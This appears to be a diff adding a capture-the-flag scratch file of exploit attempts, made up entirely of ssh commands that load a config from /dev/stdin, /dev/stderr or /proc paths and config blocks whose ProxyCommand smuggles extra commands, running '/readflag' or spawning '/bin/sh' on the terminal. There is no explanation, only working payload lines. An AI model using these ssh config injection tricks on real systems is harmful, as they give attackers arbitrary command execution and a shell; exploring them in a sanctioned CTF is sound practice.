@@ -1,0 +1,19 @@
+ssh -F /dev/stdin x
+ssh -F /dev/stderr localhost
+
+Host localhost
+    ProxyCommand ;echo flagflag > /dev/tty
+
+Host localhost
+    ProxyCommand ;/readflag > /dev/tty; exit
+
+
+Host x
+    ProxyCommand ;/bin/sh 0<&2 1>&2
+
+ssh -F /proc/self/fd/0 localhost
+
+ssh -F /proc/1/cmdline localhost
+
+ssh -F /proc/10/cmdline localhost
+ssh -F /proc/10/fd/0 localhost
